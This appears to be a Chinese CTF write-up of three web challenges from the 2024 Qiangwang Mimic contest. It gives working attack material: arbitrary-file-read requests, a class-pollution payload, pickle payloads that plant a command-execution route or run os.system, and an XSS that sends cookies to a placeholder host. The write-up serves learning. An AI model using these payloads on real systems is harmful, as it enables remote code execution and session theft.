+++
title = "强网拟态2024"
slug = "qiangwang-mimic-2024"
description = "明年一定进决赛"
date = "2024-10-19T20:28:38"
lastmod = "2024-10-19T20:28:38"
image = ""
license = ""
categories = ["赛题"]
tags = ["xss", "pickle"]
+++

# 0x01 说在前面

省赛搞一起了，我连账号都没有，不过借到朋友的账号可以试试看:grin:

# 0x02 question

## capoo

发现可以任意文件读取，读到的是`base64`的编码情况，直接尝试读`flag`，失败了

```
POST /showpic.php HTTP/1.1
Host: web-64c0cdc1b2.challenge.xctf.org.cn
Content-Length: 11
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
Origin: http://web-64c0cdc1b2.challenge.xctf.org.cn
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://web-64c0cdc1b2.challenge.xctf.org.cn/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close

capoo=/flag
```

那么文件名肯定是不对的，这里我们读取一些敏感文件，我起码读了十几个敏感文件，读到的基本没用，后面真是想到了前几天出题，Docker的根目录有好东西

```
POST /showpic.php HTTP/1.1
Host: web-73a38d83f9.challenge.xctf.org.cn
Content-Length: 15
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
Origin: http://web-64c0cdc1b2.challenge.xctf.org.cn
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://web-64c0cdc1b2.challenge.xctf.org.cn/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close

capoo=/start.sh
```

```
#!/bin/sh

rm -f /docker-entrypoint.sh

# Get the user
user=$(ls /home)

# Check the environment variables for the flag and assign to INSERT_FLAG
# 需要注意，以下语句会将FLAG相关传递变量进行覆盖，如果需要，请注意修改相关操作
#if [ "$DASFLAG" ]; then
#    INSERT_FLAG="$DASFLAG"
#    export DASFLAG=no_FLAG
#    DASFLAG=no_FLAG
#elif [ "$FLAG" ]; then
#    INSERT_FLAG="$FLAG"
#    export FLAG=no_FLAG
#    FLAG=no_FLAG
#elif [ "$GZCTF_FLAG" ]; then
#    INSERT_FLAG="$GZCTF_FLAG"
#    export GZCTF_FLAG=no_FLAG
#    GZCTF_FLAG=no_FLAG
#else
#    INSERT_FLAG="flag{TEST_Dynamic_FLAG}"
#fi

# 将FLAG写入文件 请根据需要修改
#echo $INSERT_FLAG | tee /flag

#touch /flag
chmod 744 /flag-33ac806f

php-fpm & nginx &

echo "Running..."

tail -F /var/log/nginx/access.log /var/log/nginx/error.log
```

发现了flag文件哈哈，这个生成形式和我当时写的一模一样，只不过我没给权限，这给权限有啥用

```
POST /showpic.php HTTP/1.1
Host: web-73a38d83f9.challenge.xctf.org.cn
Content-Length: 20
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
Origin: http://web-64c0cdc1b2.challenge.xctf.org.cn
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://web-64c0cdc1b2.challenge.xctf.org.cn/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close

capoo=/flag-33ac806f
```

## ez_picker

一个sanic框架的pickle反序列化？我都不会我丢

```python
from sanic import Sanic
from sanic.response import json,file as file_,text,redirect
from sanic_cors import CORS
from key import secret_key
import os
import pickle
import time
import jwt
import io
import builtins
app = Sanic("App")
pickle_file = "data.pkl"
my_object = {}
users = []

safe_modules = {
    'math',
    'datetime',
    'json',
    'collections',
}

safe_names = {
    'sqrt', 'pow', 'sin', 'cos', 'tan',
    'date', 'datetime', 'timedelta', 'timezone', 
    'loads', 'dumps',  
    'namedtuple', 'deque', 'Counter', 'defaultdict'
}

class RestrictedUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        if module in safe_modules and name in safe_names:
            return getattr(builtins, name)
        raise pickle.UnpicklingError("global '%s.%s' is forbidden" %(module, name))
    
def restricted_loads(s):
    return RestrictedUnpickler(io.BytesIO(s)).load()

CORS(app, supports_credentials=True, origins=["http://localhost:8000", "http://127.0.0.1:8000"])
class User:
    def __init__(self,username,password):
        self.username=username
        self.password=password
        

def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

def token_required(func):
    async def wrapper(request, *args, **kwargs):
        token = request.cookies.get("token")  
        if not token:
            return redirect('/login')
        try:
            result=jwt.decode(token, str(secret_key), algorithms=['HS256'], options={"verify_signature": True})
        except jwt.ExpiredSignatureError:
            return json({"status": "fail", "message": "Token expired"}, status=401)
        except jwt.InvalidTokenError:
            return json({"status": "fail", "message": "Invalid token"}, status=401)
        print(result)
        if result["role"]!="admin":
            return json({"status": "fail", "message": "Permission Denied"}, status=401)
        return await func(request, *args, **kwargs)
    return wrapper

@app.route('/', methods=["GET"])
def file_reader(request):
    file = "app.py"
    with open(file, 'r') as f:
        content = f.read()
    return text(content)

@app.route('/upload', methods=["GET","POST"])
@token_required
async def upload(request):
    if request.method=="GET":
        return await file_('templates/upload.html')
    if not request.files:
        return text("No file provided", status=400)

    file = request.files.get('file')
    file_object = file[0] if isinstance(file, list) else file
    try:
        new_data = restricted_loads(file_object.body)
        try:
            my_object.update(new_data)
        except:
            return json({"status": "success", "message": "Pickle object loaded but not updated"})
        with open(pickle_file, "wb") as f:
            pickle.dump(my_object, f)

        return json({"status": "success", "message": "Pickle object updated"})
    except pickle.UnpicklingError:
        return text("Dangerous pickle file", status=400)
    
@app.route('/register', methods=['GET','POST'])
async def register(request):
    if request.method=='GET':
        return await file_('templates/register.html')
    if request.json:
        NewUser=User("username","password")
        merge(request.json, NewUser)
        users.append(NewUser)
    else:
        return json({"status": "fail", "message": "Invalid request"}, status=400)
    return json({"status": "success", "message": "Register Success!","redirect": "/login"})

@app.route('/login', methods=['GET','POST'])
async def login(request):
    if request.method=='GET':
        return await file_('templates/login.html')
    if request.json:
        username = request.json.get("username")
        password = request.json.get("password")
        if not username or not password:
            return json({"status": "fail", "message": "Username or password missing"}, status=400)
        user = next((u for u in users if u.username == username), None)
        if user:
            if user.password == password:
                data={"user":username,"role":"guest"}
                data['exp'] = int(time.time()) + 60 *5
                token = jwt.encode(data, str(secret_key), algorithm='HS256')
                response = json({"status": "success", "redirect": "/upload"})
                response.cookies["token"]=token
                response.headers['Access-Control-Allow-Origin'] = request.headers.get('origin')
                return response
            else:
                return json({"status": "fail", "message": "Invalid password"}, status=400)
        else:
            return json({"status": "fail", "message": "User not found"}, status=404)
    return json({"status": "fail", "message": "Invalid request"}, status=400)

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=8000)
```

污染环境

```python
import json
import requests
url="http://web-05191a6c96.challenge.xctf.org.cn/register"

payload={
    "__init__":{
        "__globals__":{
            "secret_key":"baozongwi",
            "NewUser":{
                "username":"admin",
                "password":"666666"
            },
            "safe_modules":"builtins",
            "safe_names":["getattr","system","dict","globals"]
        }
    }
}
r = requests.post(url=url, json=payload)
print(r.status_code)
print(r.text)
```

然后注册

```
username:admin
password:666666

拿到token
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYmFvem9uZ3dpIiwicm9sZSI6Imd1ZXN0IiwiZXhwIjoxNzI5MzQ3NDgxfQ.1CV6uS8_f3GpzSobSUq9wD8FOENO8YEXiGLYseER5Lo
```

伪造jwt就可以上传文件了，但是这里是一个jwt只能上传一次

而且我写的文件貌似是很有问题，上传不成功，弹不出来`shell`，卡着了

后来找到说是可以直接RCE的(看师傅们的做法)

打内存马

```python
import pickle
from flask import Flask, request

app = Flask(__name__)

class A():
    def __reduce__(self):
        return (eval, ('app.add_route(lambda request:__import__("os").popen(request.args.get("cmd")).read(), "/shell", methods=["GET", "POST"])',))

a = A()
b = pickle.dumps(a)
print(b)

with open("poc.pkl", "wb") as f:
    f.write(b)
```

然后上传之后就`getshell`了

还有一种是直接写文件

```python
import pickle

# 提供的pickle序列化字符串
pickle_data = b"c__builtin__\ngetattr\n(c__builtin__\n__import__\n(S'os'\ntRS'system'\ntR(S'more /tr3e_fl4g_1s_h3re_lol >/app/templates/index.html'\ntR."

# 将pickle序列化字符串写入文件
with open("malicious.pkl", "wb") as f:
    f.write(pickle_data)

print("Pickle data has been written to malicious.pkl")
```

pickle反序列化感觉经常有哇，这个月必须把他学了，师傅们好厉害这次比赛学到了

## Spreader

index.js

```js
const fs = require('fs');
const express = require('express');
const router = express.Router();
const { triggerXSS } = require('../bot');
const { Store } = require('express-session');
function isAuthenticated(req, res, next) {
    if (req.session.user) {
        next();
    } else {
        res.redirect('/login');
    }
}
module.exports = (users,posts,store,AdminPassWord,PrivilegedPassWord) => {

    const ROLES = {
        PLAIN: "plain",
        PRIVILEGED: "privileged",
        ADMIN: "admin",
    };

    router.get('/register', (req, res) => {
        res.sendFile('register.html', { root: './views' });
    });

    router.post('/register', (req, res) => {
        const { username, password, role } = req.body;
        const userExists = users.some(u => u.username === username);
        if (userExists) {
            return res.send('Username already exists!');
        }
        users.push({ username, password, role: "plain" });
        res.redirect('/login');
    });
    router.get('/login', (req, res) => {
        res.sendFile('login.html', { root: './views' });
    });

    router.post('/login', (req, res) => {
        const { username, password } = req.body;
        console.log(username);
        console.log(password);
        const user = users.find(u => u.username === username && u.password === password);
        if (user) {
            req.session.user = user;
            res.redirect('/');
        } else {
            res.send('Invalid credentials!');
        }
    });
    router.get('/', isAuthenticated, (req, res) => {
        const currentUser = req.session.user;
        let filteredPosts = [];
        if (currentUser.role === ROLES.ADMIN) {
            filteredPosts = posts.filter(p => p.role === ROLES.PRIVILEGED || p.role === ROLES.ADMIN);
        } else if (currentUser.role === ROLES.PRIVILEGED) {
            filteredPosts = posts.filter(p => p.role === ROLES.PLAIN || p.role === ROLES.PRIVILEGED);
        } else {
            filteredPosts = posts.filter(p => p.role === ROLES.PLAIN);
        }
        res.render(`${currentUser.role}`, { posts: filteredPosts, user: currentUser });
    });
    router.post('/post', isAuthenticated, (req, res) => {
        let { content } = req.body;
    
        const scriptTagRegex = /<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi;
        content = content.replace(scriptTagRegex, '[XSS attempt blocked]');

        const eventHandlerRegex = /on\w+\s*=\s*(["']).*?\1/gi;
        content = content.replace(eventHandlerRegex, '[XSS attempt blocked]');
    
        const javascriptURLRegex = /(?:href|src)\s*=\s*(["'])\s*javascript:.*?\1/gi;
        content = content.replace(javascriptURLRegex, '[XSS attempt blocked]');
    
        const dataURLRegex = /(?:href|src)\s*=\s*(["'])\s*data:.*?\1/gi;
        content = content.replace(dataURLRegex, '[XSS attempt blocked]');
    
        const cssExpressionRegex = /style\s*=\s*(["']).*?expression\([^>]*?\).*?\1/gi;
        content = content.replace(cssExpressionRegex, '[XSS attempt blocked]');
    
        const dangerousTagsRegex = /<\/?(?:iframe|object|embed|link|meta|svg|base|source|form|input|video|audio|textarea|button|frame|frameset|applet)[^>]*?>/gi;
        content = content.replace(dangerousTagsRegex, '[XSS attempt blocked]');
    
        const dangerousAttributesRegex = /\b(?:style|srcset|formaction|xlink:href|contenteditable|xmlns)\s*=\s*(["']).*?\1/gi;
        content = content.replace(dangerousAttributesRegex, '[XSS attempt blocked]');
    
        const dangerousProtocolsRegex = /(?:href|src)\s*=\s*(["'])(?:\s*javascript:|vbscript:|file:|data:|filesystem:).*?\1/gi;
        content = content.replace(dangerousProtocolsRegex, '[XSS attempt blocked]');
    
        const dangerousFunctionsRegex = /\b(?:eval|alert|prompt|confirm|console\.log|Function)\s*\(/gi;
        content = content.replace(dangerousFunctionsRegex, '[XSS attempt blocked]');
    
        posts.push({ content: content, username: req.session.user.username, role: req.session.user.role });
        res.redirect('/');
    });
    
    
    router.get('/logout', (req, res) => {
        req.session.destroy();
        res.redirect('/login');
    });
    router.get('/report_admin', async (req, res) => {
        try {
            await triggerXSS("admin",AdminPassWord);
            res.send(`Admin Bot successfully logged in.`);
        } catch (error) {
            console.error('Error Reporting:', error);
            res.send(`Admin Bot successfully logged in.`);
        }
    });
    router.get('/report_privileged', async (req, res) => {
        try {
            await triggerXSS("privileged",PrivilegedPassWord);
            res.send(`Privileged Bot successfully logged in.`);
        } catch (error) {
            console.error('Error Reporting:', error);
            res.send(`Privileged Bot successfully logged in.`);
        }
    });
    router.get('/store', async (req, res) => {
        return res.status(200).json(store);
    });
    router.post('/store', async (req, res) => {
        if (req.body) {
            store.push(req.body);
            return res.status(200).send('Data stored successfully');
        } else {
            return res.status(400).send('No data received');
        }
    });
    router.get('/flag', async (req, res) => {
        try {
            if (req.session.user && req.session.user.role === "admin") {
                fs.readFile('/flag', 'utf8', (err, data) => {
                    if (err) {
                        console.error('Error reading flag file:', err);
                        return res.status(500).send('Internal Server Error');
                    }
                    res.send(`Your Flag Here: ${data}`);
                });
            } else {
                res.status(403).send('Unauthorized!');
            }
        } catch (error) {
            console.error('Error fetching flag:', error);
            res.status(500).send('Internal Server Error');
        }
    });
    return router;
};
```

bot.js

```js
const puppeteer = require('puppeteer');

async function triggerXSS(UserName, PassWord) {
    const browser = await puppeteer.launch({
        args: ['--no-sandbox', '--disable-setuid-sandbox'],
        executablePath: '/usr/bin/chromium',
        headless: true
    });

    const page = await browser.newPage();

    await page.goto('http://localhost:3000/login');

    await page.type('input[name="username"]', UserName);
    await page.type('input[name="password"]', PassWord);

    await page.click('button[type="submit"]');

    await page.goto('http://localhost:3000/');

    await browser.close();

    return;
}

module.exports = { triggerXSS };
```

app.js

```js
const express = require('express');
const session = require('express-session');
const stringRandom = require('string-random');
const bodyParser = require('body-parser');
const app = express();
const port = 3000;
const AdminPassWord=stringRandom(16, { numbers: true })
const PrivilegedPassWord=stringRandom(16, { numbers: true })
const PlainPassWord=stringRandom(16, { numbers: true })
const secret_key=stringRandom(16, { numbers: true })
const users = [];
const posts = [];
const store = [];
users.push({ username:"admin", password:AdminPassWord, role: "admin" });
users.push({ username:"privileged", password:PrivilegedPassWord, role: "privileged" });
users.push({ username:"plain", password:PlainPassWord, role: "plain" });
console.log(users)
app.use(express.static('views'));
app.set('view engine', 'ejs');
app.use(bodyParser.urlencoded({ extended: true }));
app.use(session({
    secret: secret_key,
    resave: false,
    saveUninitialized: true,
    cookie: {
        httpOnly: false,
        secure: false,
    }
}));


app.use('/', require('./routes/index')(users,posts,store,AdminPassWord,PrivilegedPassWord));

app.listen(port, () => {
    console.log(`App is running on http://localhost:${port}`);
});
```

这道题欠着，今天太累了

---

欧克我来了，这里先看代码，发现xss那么我们需要找口子，估计是拿cookie，因为最后的`/flag`路由可以得到`flag`只不过需要授权，看到`/post`有很多过滤，不过其实在`/register`就已经可以进行xss了

```js
router.get('/register', (req, res) => {
    res.sendFile('register.html', { root: './views' });
});

router.post('/register', (req, res) => {
    const { username, password, role } = req.body;
    const userExists = users.some(u => u.username === username);
    if (userExists) {
        return res.send('Username already exists!');
    }
    users.push({ username, password, role: "plain" });
    res.redirect('/login');
});

```

这里直接返回了`username`所以我们注册之后发帖可以打`xss`

```
http://web-acd976ed49.challenge.xctf.org.cn/register
POST:
username=<script src="http://ip:12138/poc.js"></script>&password=1
```

写一个poc.js

```js
<img src=/ onerror="window.location='http://ip:9999/?a='+document.cookie;">
```

然后访问`/report_privileged`拿一个cookie之后再去同样的方法`/report_admin`来拿`admin`，不过这里我看到说可以直接去拿`admin`，这样子确实步骤少点

# 0x03 小结

得赶紧学学东西了，flask框架这玩意也只能在小比赛里面用用



